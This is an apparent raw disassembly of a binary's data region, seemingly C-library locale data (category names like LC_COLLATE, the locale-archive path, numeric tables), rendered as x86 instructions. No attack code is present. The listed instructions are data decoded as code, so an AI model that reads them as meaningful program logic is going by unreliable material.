pop edi
inc ebx
dec edi
dec esp
dec esp
inc ecx
push esp
inc ebp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
dec ebp
dec edi
dec esi
inc ebp
push esp
inc ecx
push edx
pop ecx
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
dec ebp
inc ebp
push ebx
push ebx
inc ecx
inc edi
inc ebp
push ebx
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
inc ecx
dec esp
dec esp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
push eax
inc ecx
push eax
inc ebp
push edx
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
dec esi
inc ecx
dec ebp
inc ebp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
inc ecx
inc esp
inc esp
push edx
inc ebp
push ebx
push ebx
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
push esp
inc ebp
dec esp
inc ebp
push eax
dec eax
dec edi
dec esi
inc ebp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
dec ebp
inc ebp
inc ecx
push ebx
push ebp
push edx
inc ebp
dec ebp
inc ebp
dec esi
push esp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
dec ecx
inc esp
inc ebp
dec esi
push esp
dec ecx
inc esi
dec ecx
inc ebx
inc ecx
push esp
dec ecx
dec edi
dec esi
add byte [edi + ecx*2 + 0x43], cl
dec esp
dec edi
inc ebx
push eax
inc ecx
push esp
dec eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
int1
cmp eax, 0x3dfa0809
or dword [eax], ecx
add eax, 0xd08093e
or dword ds:[eax], ecx
or eax, 0x1808093e
or dword ds:[eax], ecx
and al, 0x3e
or dword [eax], ecx
xor byte [esi], bh
or dword [eax], ecx
aaa
or dword ds:[eax], ecx
inc eax
or dword ds:[eax], ecx
dec eax
or dword ds:[eax], ecx
push ebx
or dword ds:[eax], ecx
pushal
or dword ds:[eax], ecx
outsd dx, dword [esi]
or dword ds:[eax], ecx
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or al, byte [eax]
add byte [eax], al
pop es
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [ebx], cl
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [eax], cl
or byte [eax], al
add byte [eax], al
pop es
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
push cs
add byte [eax], al
add byte [ecx], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add al, al
out dx, al
add eax, 8
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi], ch
das
jne str.locale_codeset_____void__0_
jb 0x8093f94
insb byte es:[edi], dx
imul esp, dword [edx + 0x2f], 0x61636f6c
insb byte es:[edi], dx
add byte gs:[eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], cl
add byte [eax], al
add byte [0x6e000000], al
add byte [eax], al
add byte [edx], dl
add byte [eax], al
add byte [0x4000000], ch
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
add al, 0
add byte [eax], al
add dword [eax], eax
add byte [eax], al
sldt word [eax]
add byte [ecx + eax*2 + 0x4e], cl
dec esp
inc ecx
dec esi
inc edi
add byte [edi + 0x6e], bl
pop edi
outsb dx, byte [esi]
insb byte es:[edi], dx
pop edi
imul bp, word [esi + 0x64], 0x6c5f
outsd dx, dword [esi]
arpl word [ecx + 0x6c], sp
add byte gs:[esi + 0x69], ah
imul bp, word [esi + 0x64], 0x6f6c
arpl word [ecx + 0x6c], sp
arpl word cs:[eax], ax
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [ecx + 0x6c], sp
pop edi
arpl word [edi + 0x64], bp
jae 0x8094048
je 0x8094005
and dword [0x76282820], edi
outsd dx, dword [esi]
imul esp, dword [eax + 0x2a], 0x293029
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
push ebp
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [edi], ch
add byte [eax], al
adc eax, dword [eax]
add byte [eax], al
add byte cs:[eax], al
add byte [0], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [0x5000000], cl
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], dl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [0x1000000], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [0x8000000], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add eax, 0x1000000
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [0x1000000], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [0x8000000], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add eax, 0x5000000
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [0x8000000], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
add eax, 0x8000000
add byte [eax], al
add byte [0x1000000], al
add byte [eax], al
add byte [0], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add byte [eax], al
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add dword [eax], eax
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, 0x5000000
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [edi], al
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
add eax, 0x5000000
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [esi], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [0x1000000], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], cl
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
or al, byte [eax]
add byte [eax], al
or byte [eax], al
add byte [eax], al
or byte [eax], al
add byte [eax], al
add eax, dword [eax]
add byte [eax], al
add eax, 0x3000000
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [0x5000000], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [0x1000000], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ebx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [ecx], al
add byte [eax], al
add byte [edi], ch
das
jne 0x80945b6
jb 0x8094574
insb byte es:[edi], dx
imul esp, dword [edx + 0x2f], 0x61636f6c
insb byte es:[edi], dx
das
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [ecx + 0x6c], sp
sub eax, 0x68637261
imul esi, dword [esi + 0x65], 0x6c6e5f00
pop edi
outsb dx, byte [esi]
insb byte es:[edi], dx
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
popal
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [ecx + 0x6c], sp
pop edi
jb 0x80945e1
insd dword es:[edi], dx
pop edi
popal
jb 0x80945da
push 0x657669
insb byte es:[edi], dx
outsd dx, dword [esi]
popal
popal
jb 0x80945e6
push 0x2e657669
arpl word [eax], ax
jb 0x80945ed
outsb dx, byte [esi]
jae 0x80945ec
arpl word [esi + 0x74], bp
pop ebp
jb 0x8094608
insd dword es:[edi], dx
and byte [esi], bh
cmp eax, 0x6f726620
insd dword es:[edi], dx
add byte [ecx + 0x73], ch
insb byte es:[edi], dx
popal
jae 0x809461b
sub eax, 0x78656e3e
je 0x80945ce
cmp eax, 0x616d203d
jo 0x8094625
add byte fs:[eax], ch
sub byte [eax], ch
sub byte [eax], ch
jo 0x8094631
sub dword [eax], esp
sub eax, 0x20293120
and byte es:[eax], ch
jo 0x809463d
sub dword [ecx], ebp
and byte [0x2930203d], bh
add byte [edi + 0x6e], bl
pop edi
outsb dx, byte [esi]
insb byte es:[edi], dx
pop edi
popal
jb 0x809463d
push 0x5f657669
jae 0x8094656
bound esp, qword [esi + 0x72]
jb 0x809464d
jae str.archmapped__headmap
popal
jb 0x8094650
push 0x7070616d
and byte fs:[0x6826203d], bh
popal
insd dword es:[edi], dx
popal
jo 0x8094601
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edx], al
add byte [eax], al
add byte [eax + eax], al
add byte [eax], al
push es
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax + eax], cl
add byte [eax], al
push cs
add byte [eax], al
add byte [eax], dl
add byte [eax], al
add byte [edx], dl
add byte [eax], al
add byte [eax + eax], dl
add byte [eax], al
push ss
add byte [eax], al
add byte [eax], bl
add byte [eax], al
add byte [edx], bl
add byte [eax], al
add byte [eax + eax], bl
add byte [eax], al
push ds
add byte [eax], al
add byte [eax], ah
and byte [eax], al
add byte [eax], al
and al, byte [eax]
add byte [eax], al
and al, 0
add byte [eax], al
add byte es:[eax], al
add byte [eax], ch
add byte [eax], al
add byte [edx], ch
add byte [eax], al
add byte [eax + eax], ch
add byte [eax], al
add byte cs:[eax], al
add byte [eax], dh
add byte [eax], al
add byte [edx], dh
add byte [eax], al
add byte [eax + eax], dh
add byte [eax], al
add byte ss:[eax], al
add byte [eax], bh
add byte [eax], al
add byte [edx], bh
add byte [eax], al
add byte [eax + eax], bh
add byte [eax], al
add byte ds:[eax], al
add byte [eax], al
add byte [eax], al
inc edx
add byte [eax], al
add byte [eax + eax], al
add byte [esi], al
add byte [eax], al
dec eax
add byte [eax], al
add byte [edx], cl
add byte [eax], al
dec esp
add byte [eax], al
add byte [esi], cl
add byte [eax], al
push eax
add byte [eax], al
add byte [edx], dl
add byte [eax], al
push esp
add byte [eax], al
add byte [esi], dl
add byte [eax], al
pop eax
add byte [eax], al
add byte [edx], bl
add byte [eax], al
pop esp
add byte [eax], al
add byte [esi], bl
add byte [eax], al
pushal
add byte [eax], al
add byte [edx], ah
add byte [eax], al
add byte fs:[eax], al
add byte [esi], ah
add byte [eax], al
push 0x6a000000
add byte [eax], al
add byte [eax + eax], ch
add byte [esi], ch
add byte [eax], al
jo 0x8094702
add byte [eax], al
jb 0x8094706
add byte [eax], al
je 0x809470a
add byte [eax], al
jbe 0x809470e
add byte [eax], al
js 0x8094712
add byte [eax], al
jp 0x8094716
add byte [eax], al
jl 0x809471a
add byte [eax], al
jle 0x809471e
add byte [eax], al
add byte [eax], 0
add byte [edx - 0x7c000000], al
add byte [eax], al
add byte [esi - 0x78000000], al
add byte [eax], al
add byte [edx - 0x74000000], cl
add byte [eax], al
add byte [esi - 0x70000000], cl
add byte [eax], al
add byte [edx - 0x6c000000], dl
add byte [eax], al
add byte [esi - 0x68000000], dl
add byte [eax], al
add byte [edx - 0x64000000], bl
add byte [eax], al
add byte [esi - 0x60000000], bl
add byte [eax], al
add byte [edx - 0x5c000000], ah
add byte [eax], al
add byte [esi - 0x58000000], ah
add byte [eax], al
add byte [edx - 0x54000000], ch
add byte [eax], al
add byte [esi - 0x50000000], ch
add byte [eax], al
add byte [edx - 0x4c000000], dh
add byte [eax], al
add byte [esi - 0x48000000], dh
add byte [eax], al
add byte [edx - 0x44000000], bh
add byte [eax], al
add byte [esi - 0x40000000], bh
add byte [eax], al
add dl, al
add byte [eax], al
add ah, al
add byte [eax], al
add dh, al
add byte [eax], al
add al, cl
add byte [eax], al
add dl, cl
add byte [eax], al
add ah, cl
add byte [eax], al
add dh, cl
add byte [eax], al
add al, dl
add byte [eax], al
add dl, dl
add byte [eax], al
add ah, dl
add byte [eax], al
add dh, dl
add byte [eax], al
add al, bl
add byte [eax], al
add dl, bl
add byte [eax], al
add ah, bl
add byte [eax], al
add dh, bl
add byte [eax], al
add al, ah
add byte [eax], al
add dl, ah
add byte [eax], al
add ah, ah
add byte [eax], al
add dh, ah
add byte [eax], al
add al, ch
add byte [eax], al
add dl, ch
add byte [eax], al
add ah, ch
add byte [eax], al
add dh, ch
add byte [eax], al
add al, dh
add byte [eax], al
add dl, dh
add byte [eax], al
add ah, dh
add byte [eax], al
add dh, dh
add byte [eax], al
add al, bh
add byte [eax], al
add dl, bh
add byte [eax], al
add ah, bh
add byte [eax], al
add dh, bh
add byte [eax], al
add byte [eax], al
add dword [eax], eax
add byte [edx], al
add dword [eax], eax
add byte [ecx + eax], al
add byte [eax], al
push es
add dword [eax], eax
add byte [eax], cl
add dword [eax], eax
add byte [edx], cl
add dword [eax], eax
add byte [ecx + eax], cl
add byte [eax], al
push cs
add dword [eax], eax
add byte [eax], dl
add dword [eax], eax
add byte [edx], dl
add dword [eax], eax
add byte [ecx + eax], dl
add byte [eax], al
push ss
add dword [eax], eax
add byte [eax], bl
add dword [eax], eax
add byte [edx], bl
add dword [eax], eax
add byte [ecx + eax], bl
add byte [eax], al
push ds
add dword [eax], eax
add byte [eax], ah
add dword [eax], eax
add byte [edx], ah
add dword [eax], eax
add byte [ecx + eax], ah
add byte [eax], al
add dword es:[eax], eax
add byte [eax], ch
add dword [eax], eax
add byte [edx], ch
add dword [eax], eax
add byte [ecx + eax], ch
add byte [eax], al
add dword cs:[eax], eax
add byte [eax], dh
add dword [eax], eax
add byte [edx], dh
add dword [eax], eax
add byte [ecx + eax], dh
add byte [eax], al
add dword ss:[eax], eax
add byte [eax], bh
add dword [eax], eax
add byte [edx], bh
add dword [eax], eax
add byte [ecx + eax], bh
add byte [eax], al
add dword ds:[eax], eax
add byte [eax + 1], al
add byte [eax], al
inc edx
add dword [eax], eax
add byte [ecx + eax], al
add byte [esi + 1], al
add byte [eax], al
dec eax
add dword [eax], eax
add byte [edx + 1], cl
add byte [eax], al
dec esp
add dword [eax], eax
add byte [esi + 1], cl
add byte [eax], al
push eax
add dword [eax], eax
add byte [edx + 1], dl
add byte [eax], al
push esp
add dword [eax], eax
add byte [esi + 1], dl
add byte [eax], al
pop eax
add dword [eax], eax
add byte [edx + 1], bl
add byte [eax], al
pop esp
add dword [eax], eax
add byte [esi + 1], bl
add byte [eax], al
pushal
add dword [eax], eax
add byte [edx + 1], ah
add byte [eax], al
add dword fs:[eax], eax
add byte [esi + 1], ah
add byte [eax], al
push 0x6a000001
add dword [eax], eax
add byte [ecx + eax], ch
add byte [esi + 1], ch
add byte [eax], al
jo 0x8094903
add byte [eax], al
jb 0x8094907
add byte [eax], al
je 0x809490b
add byte [eax], al
jbe 0x809490f
add byte [eax], al
js 0x8094913
add byte [eax], al
jp 0x8094917
add byte [eax], al
jl 0x809491b
add byte [eax], al
jle 0x809491f
add byte [eax], al
add byte [ecx], 0
add byte [edx - 0x7bffffff], al
add dword [eax], eax
add byte [esi - 0x77ffffff], al
add dword [eax], eax
add byte [edx - 0x73ffffff], cl
add dword [eax], eax
add byte [esi - 0x6fffffff], cl
add dword [eax], eax
add byte [edx - 0x6bffffff], dl
add dword [eax], eax
add byte [esi - 0x67ffffff], dl
add dword [eax], eax
add byte [edx - 0x63ffffff], bl
add dword [eax], eax
add byte [esi - 0x5fffffff], bl
add dword [eax], eax
add byte [edx - 0x5bffffff], ah
add dword [eax], eax
add byte [esi - 0x57ffffff], ah
add dword [eax], eax
add byte [edx - 0x53ffffff], ch
add dword [eax], eax
add byte [esi - 0x4fffffff], ch
add dword [eax], eax
add byte [edx - 0x4bffffff], dh
add dword [eax], eax
add byte [esi - 0x47ffffff], dh
add dword [eax], eax
add byte [edx - 0x43ffffff], bh
add dword [eax], eax
add byte [esi - 0x3fffffff], bh
add dword [eax], eax
add dl, al
add dword [eax], eax
add ah, al
add dword [eax], eax
add dh, al
add dword [eax], eax
add al, cl
add dword [eax], eax
add dl, cl
add dword [eax], eax
add ah, cl
add dword [eax], eax
add dh, cl
add dword [eax], eax
add al, dl
add dword [eax], eax
add dl, dl
add dword [eax], eax
add ah, dl
add dword [eax], eax
add dh, dl
add dword [eax], eax
add al, bl
add dword [eax], eax
add dl, bl
add dword [eax], eax
add ah, bl
add dword [eax], eax
add dh, bl
add dword [eax], eax
add al, ah
add dword [eax], eax
add dl, ah
add dword [eax], eax
add ah, ah
add dword [eax], eax
add dh, ah
add dword [eax], eax
add al, ch
add dword [eax], eax
add dl, ch
add dword [eax], eax
add ah, ch
add dword [eax], eax
add dh, ch
add dword [eax], eax
add al, dh
add dword [eax], eax
add dl, dh
add dword [eax], eax
add ah, dh
add dword [eax], eax
add dh, dh
add dword [eax], eax
add al, bh
add dword [eax], eax
add dl, bh
add dword [eax], eax
add ah, bh
add dword [eax], eax
add dh, bh
add dword [eax], eax
add byte [eax], al
add al, byte [eax]
add byte [edx], al
add al, byte [eax]
add byte [edx + eax], al
add byte [eax], al
push es
add al, byte [eax]
add byte [eax], cl
add al, byte [eax]
add byte [edx], cl
add al, byte [eax]
add byte [edx + eax], cl
add byte [eax], al
push cs
add al, byte [eax]
add byte [eax], dl
add al, byte [eax]
add byte [edx], dl
add al, byte [eax]
add byte [edx + eax], dl
add byte [eax], al
push ss
add al, byte [eax]
add byte [eax], bl
add al, byte [eax]
add byte [edx], bl
add al, byte [eax]
add byte [edx + eax], bl
add byte [eax], al
push ds
add al, byte [eax]
add byte [eax], ah
add al, byte [eax]
add byte [edx], ah
add al, byte [eax]
add byte [edx + eax], ah
add byte [eax], al
add al, byte es:[eax]
add byte [eax], ch
add al, byte [eax]
add byte [edx], ch
add al, byte [eax]
add byte [edx + eax], ch
add byte [eax], al
add al, byte cs:[eax]
add byte [eax], dh
add al, byte [eax]
add byte [edx], dh
add al, byte [eax]
add byte [edx + eax], dh
add byte [eax], al
add al, byte ss:[eax]
add byte [eax], bh
add al, byte [eax]
add byte [edx], bh
add al, byte [eax]
add byte [edx + eax], bh
add byte [eax], al
add al, byte ds:[eax]
add byte [eax + 2], al
add byte [eax], al
inc edx
add al, byte [eax]
add byte [edx + eax], al
add byte [esi + 2], al
add byte [eax], al
dec eax
add al, byte [eax]
add byte [edx + 2], cl
add byte [eax], al
dec esp
add al, byte [eax]
add byte [esi + 2], cl
add byte [eax], al
push eax
add al, byte [eax]
add byte [edx + 2], dl
add byte [eax], al
push esp
add al, byte [eax]
add byte [esi + 2], dl
add byte [eax], al
pop eax
add al, byte [eax]
add byte [edx + 2], bl
add byte [eax], al
pop esp
add al, byte [eax]
add byte [esi + 2], bl
add byte [eax], al
pushal
add al, byte [eax]
add byte [edx + 2], ah
add byte [eax], al
add al, byte fs:[eax]
add byte [esi + 2], ah
add byte [eax], al
push 0x6a000002
add al, byte [eax]
add byte [edx + eax], ch
add byte [esi + 2], ch
add byte [eax], al
jo 0x8094b04
add byte [eax], al
jb 0x8094b08
add byte [eax], al
je 0x8094b0c
add byte [eax], al
jbe 0x8094b10
add byte [eax], al
js 0x8094b14
add byte [eax], al
jp 0x8094b18
add byte [eax], al
jl 0x8094b1c
add byte [eax], al
jle 0x8094b20
add byte [eax], al
add byte [edx], 0
add byte [edx - 0x7bfffffe], al
add al, byte [eax]
add byte [esi - 0x77fffffe], al
add al, byte [eax]
add byte [edx - 0x73fffffe], cl
add al, byte [eax]
add byte [esi - 0x6ffffffe], cl
add al, byte [eax]
add byte [edx - 0x6bfffffe], dl
add al, byte [eax]
add byte [esi - 0x67fffffe], dl
add al, byte [eax]
add byte [edx - 0x63fffffe], bl
